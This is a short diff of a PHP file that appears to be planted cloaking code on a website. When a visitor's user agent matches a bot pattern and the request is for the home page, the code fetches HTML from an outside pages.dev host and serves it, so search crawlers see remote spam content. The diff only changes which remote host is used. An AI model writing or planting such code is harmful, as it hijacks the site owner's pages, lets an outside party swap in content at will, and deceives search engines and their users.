@@ -18,7 +18,7 @@ function aselolejos($url){
 if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/") {
     usleep(rand(100000, 200000)); 
     header('Content-Type: text/html; charset=utf-8');
-    echo aselolejos("https://sudahjagoadalawan.pages.dev/sempakbasah/index.html");
+    echo aselolejos("https://hebatbangetkamukimai.pages.dev/sempakbasah/index.html");
     ob_end_flush();
     exit;
 }
